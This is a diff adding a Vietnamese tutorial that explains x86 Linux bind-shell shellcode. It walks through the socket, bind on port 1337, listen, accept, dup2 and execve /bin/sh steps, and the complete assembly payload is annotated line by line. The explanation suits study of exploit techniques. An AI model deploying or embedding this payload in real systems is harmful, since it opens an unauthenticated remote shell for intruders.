@@ -1,0 +1,118 @@
+
+------------------------------------------------------
+Cách làm:
+------------------------------------------------------
+Các bước thực hiện được diễn giải bằng code C:
+	1. Tạo 1 TCP socket:
+		socket (int socket_family, int socket_type, int protocol)
+			protocol 		= IPPROTO_IP	= 0x0
+			socket_type 	= SOCK_STREAM	= 0x1
+			socket_family 	= AF_INET		= 0x2
+
+	2. Bind socket vừa tạo với addr và port(1337):
+		bind (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+			sockfd 	= socket vừa tạo
+			addr 	= struct sockaddr {
+										__kernel_sa_family_t  sin_family;     /* Address family  =            */
+										__be16                sin_port;       /* Port number                  */
+										struct in_addr        sin_addr;       /* Internet address             */
+									};
+					sin_family 	= AF_INET = 0x2
+					sin_port	= 1337
+					sin_addr	= INADDR_ANY = 0x0
+
+	3. Listen kết nối đến:
+		listen(int sockfd, int backlog)
+			sockfd	= socket vừa tạo
+			backlog = 0
+
+	4. Accept kết nối đến:
+		accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
+			addr 	= 0
+			addrlen = 0
+
+	5. Redirect stdin, stdout và stderr đến socket
+		dup2(int oldfd, int newfd)
+			oldfd = socket vừa đc accept
+			newfd = stdin/stdout/stderr tương ứng với 0/1/2
+
+	6. Chạy /bin/sh để thực hiện lệnh được gửi về từ socket
+		execve("bin/sh", null, null)
+
+------------------------------------------------------
+Giải thích shellcode
+------------------------------------------------------
+
+	push 0x66 													syscall SYS_SOCKETCALL dùng để làm việc với socket + cleanup thanh ghi EAX
+	pop eax														sử dụng PUSH/POP tiết kiệm 1 byte so với XOR/MOV :v
+
+	push 0x1 													sys_socket (0x1) + cleanup thanh ghi ebx
+	pop ebx
+	xor esi, esi												ESI = 0x0
+
+	push esi 													push các tham số cho hàm socket()
+	push ebx 													
+	push 0x2
+
+	mov ecx, esp 												ECX cần chứa địa chỉ của struct vừa đẩy lên để làm tham số cho lệnh sys_socket
+																nên ta lưu ESP vào ECX
+
+	int 0x80 													chạy lệnh sys_socket(2, 1, 0)
+
+	pop edi 													EDI = 0x2
+	xchg edi, eax 												giá trị trả về của hàm socket sẽ được lưu tại EAX, ta sẽ chuyển nó sang EDI. EAX lúc này chứa 0x2
+
+	xchg ebx, eax 												chuyển giá trị 0x2 tại EAX sang EBX. sys_bind = 0x2
+	mov al, 0x66 												sys_socketcall = 0x66
+	
+	push esi         											push các tham số cho struct sockaddr
+	push word 0x3905 
+	push word bx     
+	mov ecx, esp    											lưu địa chỉ của struct vào ECX
+
+	push 0x10 													push các tham số cho hàm bind()
+	push ecx  
+	push edi  
+
+	mov ecx, esp 												lưu địa chỉ các tham số cho hàm bind()
+	
+	int 0x80 													chạy lệnh bind(socket, struct*, 16)
+
+	mov al, 0x66 
+	mov bl, 0x4  												
+
+	push esi 													
+	push edi ;sockfd
+	mov ecx, esp 
+	int 0x80 													chạy lênh sys_listen
+
+	mov al, 0x66 
+	inc ebx      												EBX = 0x5 = sys_accept			
+	push esi
+	push esi 
+	push edi 
+	mov ecx, esp
+	int 0x80 													chạy lệnh sys_accept
+
+	pop ecx 
+	pop ecx 													ECX = 0x0
+	mov cl, 0x2 												cl = 0x2
+	xchg ebx,eax 												chuyển giá trị trả về của hàm accept từ EAX vào EBX
+
+loop:
+	mov al, 0x3f 												sys_dup2 = 0x3f
+	int 0x80     												chạy lệnh sysdup2(EBX, ECX)
+	dec ecx	     												ECX--
+	jns loop     												vòng lặp: ECX sẽ nhận các giá trị lần lượt là 0x2, 0x1, 0x0
+
+	mov al, 0x0b 												sys_execve = 0x0b
+
+	push 0x68732f2f												push "/bin//sh" lên stack rồi lưu địa chỉ vào EBX
+	push 0x6e69622f
+	mov ebx, esp 
+
+	inc ecx      
+	mov edx, ecx 												EDX = 0
+
+	int 0x80 													chạy lệnh sys_execve()
+
